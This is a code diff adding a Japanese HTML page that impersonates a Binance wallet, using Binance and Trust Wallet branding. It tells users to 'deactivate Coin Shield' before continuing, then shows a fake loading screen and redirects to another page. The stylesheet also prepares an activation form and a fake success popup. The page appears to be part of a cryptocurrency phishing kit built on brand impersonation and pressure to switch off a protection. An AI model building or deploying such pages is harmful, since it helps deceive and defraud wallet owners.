@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ウォレット</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+
+      html, body {
+        margin: 0;
+        width: 100%;
+        min-height: 100vh;
+        font-family: Arial, Helvetica, sans-serif;
+        background: linear-gradient(135deg, #050b14, #0b1220 40%, #0f172a 100%);
+      }
+
+      body {
+        min-height: 100vh;
+        display: grid;
+        place-items: center;
+      }
+
+      .popup-shell {
+        width: min(86vw, 520px);
+        height: min(60vw, 300px);
+        position: relative;
+        border-radius: 20px;
+        background: linear-gradient(135deg, rgba(12, 18, 29, 0.86), rgba(23, 31, 44, 0.9));
+        border: 1px solid rgba(96, 165, 250, 0.28);
+        box-shadow: 0 24px 60px rgba(2, 6, 23, 0.8), inset 0 0 18px rgba(59, 130, 246, 0.06), inset 0 0 20px rgba(250, 204, 21, 0.02);
+        overflow: hidden;
+      }
+
+      .popup-shell::before {
+        content: "";
+        position: absolute;
+        inset: 14px;
+        border-radius: 16px;
+        border: 1px solid rgba(96, 165, 250, 0.16);
+        box-shadow: inset 0 0 12px rgba(59, 130, 246, 0.08), 0 0 18px rgba(250, 204, 21, 0.04);
+      }
+
+      .prompt-text {
+        position: absolute;
+        top: 24px;
+        left: 0;
+        right: 0;
+        color: rgba(191, 219, 254, 0.9);
+        font-size: 11px;
+        letter-spacing: 0.14em;
+        text-transform: uppercase;
+        font-weight: 700;
+        text-align: center;
+      }
+
+      .selection-message {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%) scale(0.96);
+        width: min(82%, 330px);
+        padding: 12px 16px;
+        border-radius: 12px;
+        background: rgba(22, 35, 54, 0.96);
+        border: 1px solid rgba(250, 204, 21, 0.38);
+        box-shadow: 0 0 20px rgba(250, 204, 21, 0.14), 0 18px 40px rgba(2, 6, 23, 0.45);
+        color: rgba(255, 246, 176, 0.96);
+        font-size: 10px;
+        line-height: 1.6;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        text-align: center;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.2s ease, transform 0.2s ease, visibility 0.2s ease;
+        pointer-events: none;
+        z-index: 3;
+      }
+
+      .selection-message.visible {
+        opacity: 1;
+        visibility: visible;
+        transform: translate(-50%, -50%) scale(1);
+      }
+
+      .brand-block {
+        position: absolute;
+        left: 30px;
+        top: 82px;
+        width: 180px;
+        height: 200px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 14px;
+        cursor: pointer;
+        transition: transform 0.2s ease, filter 0.2s ease;
+      }
+
+      .brand-block:hover,
+      .brand-block:focus-visible {
+        transform: translateY(-2px) scale(1.02);
+        filter: brightness(1.08);
+      }
+
+      .brand-icon-wrap {
+        position: relative;
+        width: 130px;
+        height: 130px;
+        display: grid;
+        place-items: center;
+      }
+
+      .brand-icon {
+        width: 130px;
+        height: 130px;
+        display: block;
+        filter: drop-shadow(0 0 18px rgba(96, 165, 250, 0.3));
+      }
+
+      .key-badge {
+        position: absolute;
+        bottom: 4px;
+        right: 4px;
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, rgba(250, 204, 21, 0.96), rgba(217, 119, 6, 0.9));
+        border: 2px solid rgba(12, 18, 29, 0.9);
+        box-shadow: 0 0 12px rgba(250, 204, 21, 0.28);
+        display: grid;
+        place-items: center;
+      }
+
+      .key-badge::before {
+        content: "";
+        width: 10px;
+        height: 10px;
+        border: 2px solid rgba(12, 18, 29, 0.7);
+        border-radius: 50%;
+        position: relative;
+        left: -1px;
+        top: -1px;
+      }
+
+      .key-badge::after {
+        content: "";
+        position: absolute;
+        width: 10px;
+        height: 7px;
+        border: 2px solid rgba(12, 18, 29, 0.7);
+        border-top: none;
+        border-radius: 0 0 8px 8px;
+        bottom: 5px;
+        left: 50%;
+        transform: translateX(-50%);
+      }
+
+      .brand-label {
+        color: rgba(191, 219, 254, 0.85);
+        font-size: 12px;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        font-weight: 700;
+        text-align: center;
+        line-height: 1.4;
+      }
+
+      .wallet-block {
+        position: absolute;
+        right: 32px;
+        top: 82px;
+        width: 190px;
+        height: 200px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 14px;
+        cursor: pointer;
+        transition: transform 0.2s ease, filter 0.2s ease;
+      }
+
+      .wallet-block:hover,
+      .wallet-block:focus-visible {
+        transform: translateY(-2px) scale(1.02);
+        filter: brightness(1.08);
+      }
+
+      .wallet-card {
+        position: relative;
+        width: 150px;
+        height: 150px;
+        border-radius: 30px;
+        background: linear-gradient(135deg, rgba(250, 204, 21, 0.12), rgba(22, 35, 54, 0.88));
+        border: 1px solid rgba(250, 204, 21, 0.24);
+        box-shadow: inset 0 0 16px rgba(250, 204, 21, 0.12), 0 0 14px rgba(250, 204, 21, 0.08);
+        display: grid;
+        place-items: center;
+      }
+
+      .wallet-card::before {
+        content: "";
+        position: absolute;
+        inset: 16px;
+        border-radius: 22px;
+        background: linear-gradient(135deg, rgba(250, 204, 21, 0.18), rgba(15, 23, 42, 0.16));
+        border: 1px solid rgba(250, 204, 21, 0.18);
+      }
+
+      .wallet-mark {
+        position: relative;
+        z-index: 1;
+        width: 78px;
+        height: 78px;
+        border-radius: 18px;
+        background: linear-gradient(135deg, #f0b90b, #dca406);
+        box-shadow: 0 12px 20px rgba(240, 185, 11, 0.2);
+        display: grid;
+        place-items: center;
+        overflow: hidden;
+      }
+
+      .wallet-mark img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+        filter: brightness(1.08) saturate(1.07);
+      }
+
+      .wallet-badge {
+        position: absolute;
+        right: 10px;
+        bottom: 10px;
+        z-index: 2;
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, rgba(10, 14, 22, 0.96), rgba(38, 50, 68, 0.9));
+        border: 2px solid rgba(250, 204, 21, 0.9);
+        box-shadow: 0 0 12px rgba(250, 204, 21, 0.2);
+      }
+
+      .wallet-badge::before {
+        content: "";
+        position: absolute;
+        width: 7px;
+        height: 7px;
+        border: 2px solid rgba(250, 204, 21, 0.94);
+        border-radius: 50%;
+        top: 7px;
+        left: 8px;
+      }
+
+      .wallet-badge::after {
+        content: "";
+        position: absolute;
+        width: 11px;
+        height: 8px;
+        border: 2px solid rgba(250, 204, 21, 0.94);
+        border-top: none;
+        border-radius: 0 0 8px 8px;
+        bottom: 6px;
+        left: 50%;
+        transform: translateX(-50%);
+      }
+
+      .wallet-label {
+        color: rgba(191, 219, 254, 0.85);
+        font-size: 12px;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        font-weight: 700;
+        text-align: center;
+        line-height: 1.4;
+      }
+
+      .brand-block.disabled {
+        cursor: not-allowed;
+        opacity: 0.5;
+        pointer-events: none;
+      }
+
+      .brand-block.disabled:hover,
+      .brand-block.disabled:focus-visible {
+        transform: none;
+        filter: none;
+      }
+
+      .popup-shell::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(135deg, rgba(250, 204, 21, 0.06), transparent 38%, rgba(96, 165, 250, 0.08));
+        pointer-events: none;
+      }
+
+      /* Loading Screen */
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      @keyframes fadeInLoading {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+
+      @keyframes fadeOutLoading {
+        from { opacity: 1; }
+        to { opacity: 0; }
+      }
+
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(135deg, rgba(5, 11, 20, 0.9), rgba(11, 18, 32, 0.95));
+        backdrop-filter: blur(8px);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        animation: fadeInLoading 0.3s ease-out;
+      }
+
+      .loading-overlay.active {
+        display: flex;
+      }
+
+      .loading-overlay.hidden {
+        animation: fadeOutLoading 0.5s ease-out forwards;
+      }
+
+      .loading-glass-box {
+        padding: 0;
+        background: transparent;
+        backdrop-filter: none;
+        -webkit-backdrop-filter: none;
+        border: none;
+        box-shadow: none;
+        min-width: auto;
+      }
+
+      .spinner {
+        width: 60px;
+        height: 60px;
+        margin: 0 auto;
+        border: 4px solid rgba(96, 165, 250, 0.2);
+        border-top: 4px solid #60a5fa;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      .loading-text {
+        color: rgba(191, 219, 254, 0.95);
+        font-size: 16px;
+        font-weight: 700;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+      }
+
+      .fundme-splash {
+        position: fixed;
+        inset: 0;
+        z-index: 10000;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        background: #ffffff;
+      }
+
+      .fundme-splash.active {
+        display: flex;
+      }
+
+      .fundme-splash-content {
+        width: min(88vw, 520px);
+        transform: translateY(4vh);
+      }
+
+      .fundme-splash-logo {
+        display: block;
+        width: clamp(72px, 16vw, 110px);
+        height: auto;
+        margin: 0 0 28px;
+      }
+
+      .fundme-splash-kicker {
+        margin: 0 0 24px;
+        color: #59616b;
+        font-size: clamp(20px, 4vw, 28px);
+        font-weight: 500;
+        letter-spacing: 0;
+      }
+
+      .fundme-splash-brand {
+        display: flex;
+        align-items: center;
+        gap: 22px;
+        color: #4f5660;
+        font-size: clamp(42px, 8vw, 64px);
+        font-weight: 500;
+        letter-spacing: 0;
+        line-height: 1;
+      }
+
+      .fundme-splash-name {
+        color: #e9bd45;
+        font-weight: 700;
+        letter-spacing: 0.02em;
+      }
+
+      /* Activation Modal */
+      .activation-modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.7);
+        backdrop-filter: blur(4px);
+        z-index: 10000;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .activation-modal.active {
+        display: flex;
+      }
+
+      .activation-modal-content {
+        background: linear-gradient(135deg, #1a1f2e 0%, #243447 100%);
+        border-radius: 16px;
+        padding: 40px;
+        max-width: 600px;
+        width: 90%;
+        max-height: 90vh;
+        overflow-y: auto;
+        border: 1px solid rgba(96, 165, 250, 0.3);
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        animation: slideUp 0.3s ease-out;
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .activation-modal-header {
+        text-align: center;
+        margin-bottom: 32px;
+      }
+
+      .activation-modal-logo {
+        width: 80px;
+        height: 80px;
+        margin: 0 auto 16px;
+        background: rgba(96, 165, 250, 0.1);
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 48px;
+      }
+
+      .activation-modal-title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #e0e7ff;
+        margin-bottom: 8px;
+      }
+
+      .activation-modal-subtitle {
+        font-size: 12px;
+        color: #9ca3af;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        margin-bottom: 20px;
+      }
+
+      .activation-modal-instruction {
+        font-size: 13px;
+        color: #cbd5e1;
+        text-align: center;
+        margin-bottom: 24px;
+        line-height: 1.5;
+      }
+
+      .form-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+        margin-bottom: 16px;
+      }
+
+      .form-grid.full {
+        grid-template-columns: 1fr;
+      }
+
+      .form-group {
+        display: flex;
+        flex-direction: column;
+      }
+
+      .form-label {
+        font-size: 12px;
+        font-weight: 600;
+        color: #cbd5e1;
+        margin-bottom: 6px;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+
+      .form-input {
+        padding: 10px 12px;
+        background: rgba(30, 41, 59, 0.8);
+        border: 1px solid rgba(148, 163, 184, 0.2);
+        border-radius: 6px;
+        color: #e0e7ff;
+        font-size: 13px;
+        transition: all 0.2s ease;
+      }
+
+      .form-input:focus {
+        outline: none;
+        border-color: rgba(96, 165, 250, 0.5);
+        background: rgba(30, 41, 59, 0.95);
+        box-shadow: 0 0 8px rgba(96, 165, 250, 0.2);
+      }
+
+      .form-input::placeholder {
+        color: rgba(148, 163, 184, 0.5);
+      }
+
+      .certification-box {
+        background: rgba(96, 165, 250, 0.05);
+        border: 1px solid rgba(96, 165, 250, 0.2);
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 20px;
+      }
+
+      .certification-input {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+      }
+
+      .certification-input input[type="checkbox"] {
+        width: 18px;
+        height: 18px;
+        margin-top: 2px;
+        cursor: pointer;
+        accent-color: #60a5fa;
+      }
+
+      .certification-text {
+        font-size: 12px;
+        color: #cbd5e1;
+        line-height: 1.4;
+      }
+
+      .form-actions {
+        display: flex;
+        gap: 12px;
+        margin-top: 24px;
+      }
+
+      .btn-submit {
+        flex: 1;
+        padding: 12px 20px;
+        background: linear-gradient(135deg, #3b82f6 0%, #1e40af 100%);
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        font-weight: 700;
+        font-size: 13px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+
+      .btn-submit:hover:not(:disabled) {
+        background: linear-gradient(135deg, #60a5fa 0%, #2563eb 100%);
+        transform: translateY(-1px);
+      }
+
+      .btn-submit:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      .btn-cancel {
+        padding: 12px 20px;
+        background: rgba(148, 163, 184, 0.1);
+        color: #cbd5e1;
+        border: 1px solid rgba(148, 163, 184, 0.2);
+        border-radius: 8px;
+        font-weight: 700;
+        font-size: 13px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+
+      .btn-cancel:hover {
+        background: rgba(148, 163, 184, 0.15);
+        border-color: rgba(148, 163, 184, 0.3);
+      }
+
+      /* Success Popup */
+      .success-popup {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: linear-gradient(135deg, #065f46 0%, #047857 100%);
+        border-radius: 16px;
+        padding: 32px;
+        max-width: 500px;
+        width: 90%;
+        border: 1px solid rgba(16, 185, 129, 0.3);
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        z-index: 10001;
+        animation: popUp 0.3s ease-out;
+      }
+
+      .success-popup.active {
+        display: block;
+      }
+
+      @keyframes popUp {
+        from {
+          opacity: 0;
+          transform: translate(-50%, -50%) scale(0.9);
+        }
+        to {
+          opacity: 1;
+          transform: translate(-50%, -50%) scale(1);
+        }
+      }
+
+      .success-popup-icon {
+        font-size: 48px;
+        text-align: center;
+        margin-bottom: 16px;
+      }
+
+      .success-popup-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: #d1fae5;
+        text-align: center;
+        margin-bottom: 16px;
+      }
+
+      .success-popup-details {
+        background: rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 16px;
+        font-size: 12px;
+        color: #d1fae5;
+      }
+
+      .success-popup-detail-item {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 8px;
+      }
+
+      .success-popup-detail-item:last-child {
+        margin-bottom: 0;
+      }
+
+      .success-popup-message {
+        font-size: 12px;
+        color: #d1fae5;
+        text-align: center;
+        line-height: 1.5;
+        margin-bottom: 20px;
+      }
+
+      .btn-success-ok {
+        width: 100%;
+        padding: 12px 20px;
+        background: rgba(255, 255, 255, 0.2);
+        color: #d1fae5;
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        border-radius: 8px;
+        font-weight: 700;
+        font-size: 13px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+
+      .btn-success-ok:hover {
+        background: rgba(255, 255, 255, 0.3);
+      }
+
+      .pending-request-badge {
+        display: inline-block;
+        background: #f59e0b;
+        color: #1f2937;
+        padding: 4px 12px;
+        border-radius: 6px;
+        font-size: 12px;
+        font-weight: 700;
+        margin-top: 8px;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Loading Screen Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="loading-glass-box">
+        <div class="spinner"></div>
+      </div>
+    </div>
+
+    <div class="fundme-splash" id="fundmeSplash" role="status" aria-live="polite">
+      <div class="fundme-splash-content">
+        <img class="fundme-splash-logo" src="assets/binance-4bd0f2d0.png" alt="FundMe Wallet logo" />
+        <p class="fundme-splash-kicker">ようこそ</p>
+        <div class="fundme-splash-brand">
+          <span class="fundme-splash-name">BINANCE</span>
+          <span>ウォレット</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="popup-shell" aria-label="Blank login form shape">
+      <div class="prompt-text">進むにはいずれかのオプションを選択してください</div>
+      <div class="selection-message" id="selectionMessage">Binanceウォレットに進むには、コインシールドを無効化してください</div>
+
+      <div class="brand-block" id="coinShieldOption" aria-label="Coin Shield" tabindex="0" role="button">
+        <div class="brand-icon-wrap" id="coinShieldActiveView">
+          <img
+            class="brand-icon"
+            src="https://trustwallet.com/_next/static/media/raw.0acff7b3.svg"
+            alt="Trust Wallet shield"
+          />
+          <span class="key-badge" aria-hidden="true"></span>
+        </div>
+        <div class="brand-label">コインシールド</div>
+      </div>
+
+      <div class="wallet-block" aria-label="Binance Wallet proc" tabindex="0" role="button" id="binanceOption">
+        <div class="wallet-card">
+          <div class="wallet-mark" aria-hidden="true">
+            <img src="assets/binance-logo-free-download-free-vector.jpg" alt="Binance logo" />
+          </div>
+          <span class="wallet-badge" aria-hidden="true"></span>
+        </div>
+        <div class="wallet-label">Binanceウォレット手続き...</div>
+      </div>
+    </div>
+
+    <script>
+      const selectionMessage = document.getElementById('selectionMessage');
+      const binanceOption = document.getElementById('binanceOption');
+      const coinShieldOption = document.getElementById('coinShieldOption');
+
+      // Check if user has completed Coin Shield deactivation
+      window.addEventListener('load', function() {
+        const coinShieldStatus = localStorage.getItem("coinShieldStatus") || "ACTIVE";
+        const coinShieldActiveView = document.getElementById('coinShieldActiveView');
+        const brandLabel = coinShieldOption.querySelector('.brand-label');
+        
+        if (coinShieldStatus === "DEACTIVATED") {
+          // Keep the logo visible and clickable
+          coinShieldActiveView.style.display = 'block';
+          brandLabel.style.display = 'block';
+          coinShieldOption.style.pointerEvents = 'auto';
+          coinShieldOption.style.cursor = 'pointer';
+        } else {
+          // Show active view
+          coinShieldActiveView.style.display = 'block';
+          brandLabel.style.display = 'block';
+          coinShieldOption.style.pointerEvents = 'auto';
+          coinShieldOption.style.cursor = 'pointer';
+        }
+      });
+
+      function showBinanceMessage() {
+        selectionMessage.classList.add('visible');
+      }
+
+      function handleCoinShieldClick() {
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        loadingOverlay.classList.add('active');
+        setTimeout(() => {
+          window.location.href = 'landing.html';
+        }, 4000);
+      }
+
+      binanceOption.addEventListener('click', showBinanceMessage);
+      binanceOption.addEventListener('keydown', function (event) {
+        if (event.key === 'Enter' || event.key === ' ') {
+          event.preventDefault();
+          showBinanceMessage();
+        }
+      });
+
+      coinShieldOption.addEventListener('click', handleCoinShieldClick);
+      coinShieldOption.addEventListener('keydown', function (event) {
+        if (event.key === 'Enter' || event.key === ' ') {
+          event.preventDefault();
+          handleCoinShieldClick();
+        }
+      });
+    </script>
+  </body>
+</html>
